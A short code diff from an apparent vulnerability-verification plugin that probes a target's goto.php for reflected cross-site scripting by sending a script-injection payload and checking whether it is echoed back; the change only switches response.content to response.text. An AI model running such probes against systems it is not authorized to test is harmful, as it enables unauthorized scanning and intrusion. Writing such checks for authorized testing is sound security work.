@@ -48,7 +48,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             verify_url = '%s/goto.php?url=beebee"><to>alert(1)</script>.com/' % self.target
             req = requests.get(verify_url)
-            if req.status_code == 200 and 'url=beebee"><to>alert(1)</script>.com' in req.content:
+            if req.status_code == 200 and 'url=beebee"><to>alert(1)</script>.com' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
